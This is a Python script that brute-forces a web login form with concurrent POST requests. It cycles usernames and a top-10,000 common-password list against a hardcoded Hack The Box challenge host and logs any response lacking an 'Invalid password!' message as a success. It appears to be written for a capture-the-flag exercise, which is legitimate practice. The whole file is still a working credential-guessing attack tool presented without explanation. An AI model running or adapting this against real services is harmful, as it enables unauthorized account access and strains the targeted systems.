#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import annotations

# modified fetch function with semaphore
import asyncio
import json
import re
import sys
from http import HTTPStatus
from pathlib import Path
from typing import Dict
from typing import List

import httpx
from aiohttp import ClientSession

from logger import logger

REQ_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
}


def check_regex_response(response: str, regex: str) -> bool:
    """
    Metodo para comprobar si la respuesta contiene el texto esperado, que sera el que conocemos (el de contraseña
    invalida)
    :param response:
    :param regex:
    :return:
    """
    if not re.search(regex, response, re.IGNORECASE):
        logger.warning("EXITO")
        return True
    return False


async def request_async(url: str, username: str, password: str, my_json: Dict):
    async with httpx.Client() as client:
        response = await client.post(url, data=my_json)
        # response: httpx.models.Response = await httpx.post(url, data=my_json)
        import time
        time.sleep(5)
        logger.warning(f"Fin {username} {password}")

        if response.status_code == HTTPStatus.OK:
            valid: bool = check_regex_response(response.text, 'Invalid password!')
            if valid:
                p: Path = Path('bruteforce_post_sync.log')
                with open(str(p), 'a') as f:
                    f.write(f'Trying: user: "{username}", pass: "{password}" -> Success')
                logger.info(f'Trying: user: "{username}", pass: "{password}" -> Success')
                #sys.exit(0)
            else:
                logger.info(f'Trying: user: "{username}", pass: "{password}" -> Fail')
        else:
            logger.error(response)
            logger.error(response.text)


async def fetch(session: ClientSession, url: str, username: str, password: str, my_json: Dict):
    logger.debug(f'Trying: user: "{username}", pass: "{password}"')
    # logger.warning(f"Inicio {username} {password}")
    response: ClientSession
    async with session.post(url, data=my_json) as response:
        # delay = response.headers.get("DELAY")
        # date = response.headers.get("DATE")
        # logger.warning(f"Fin {username} {password}")
        # print("{}:{} with delay {}".format(date, response.url, delay))
        return await response.read(), response


async def bound_fetch(sem: asyncio.locks.Semaphore, session: ClientSession, url: str, username: str, password: str,
                      my_json: Dict, total_size: int, cont):
    # Getter function with semaphore.
    async with sem:
        text, response = await fetch(session, url, username, password, my_json)
        if response.status == HTTPStatus.OK:
            valid: bool = check_regex_response(str(text), 'Invalid password!')
            if valid:
                logger.info(f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Success')
                sys.exit(0)
            else:
                logger.info(f'Trying {cont}/{total_size}: user: "{username}", pass: "{password}" -> Fail')
        else:
            logger.error(response)
            logger.error(text)


async def run():
    data: str = '''{"password": "%s"}'''  # %(pwd)
    name_password: str = 'password'
    name_username: str = ''

    logger.setLevel(20)  # INFO = 20
    # my_json = json.dumps(json.loads(data))
    my_json: Dict[str, str] = json.loads(data)

    file_username: Path = Path('user')
    file_password: Path = Path('password')
    file_password: Path = Path('10-million-password-list-top-10000.txt')

    len_user = len(file_username.read_text().split('\n'))
    len_pwd = len(file_password.read_text().split('\n'))

    user: str
    pwd: str
    cont: int = 1

    tasks: List = []
    # create instance of Semaphore
    sem: asyncio.locks.Semaphore = asyncio.Semaphore(1000)

    # Create client session that will ensure we dont open new connection
    # per each request.
    async with ClientSession() as session:
        for user in file_username.read_text().split('\n'):
            if len(user) == 0 and file_username in my_json.keys():  # si existe alguna liena en blanco
                break
            # Actualizamos el username si es necesario ponerlo
            if name_username in my_json.keys():
                my_json[name_username] = user

            for pwd in file_password.read_text().split('\n'):
                # if len(pwd) == 0:  # si existe alguna liena en blanco
                #    break
                # Actualizamos la contraseña
                if name_password in my_json.keys():
                    my_json[name_password] = pwd

                url = 'http://docker.hackthebox.eu:32345'
                # pass Semaphore and session to every GET request
                task = asyncio.ensure_future(
                    bound_fetch(sem, session, url, user, pwd, my_json, len_user * len_pwd, cont))
                tasks.append(task)
                cont += 1

        responses = asyncio.gather(*tasks)
        await responses


if __name__ == '__main__':
    loop = asyncio.get_event_loop()
    future = asyncio.ensure_future(run())
    loop.run_until_complete(future)
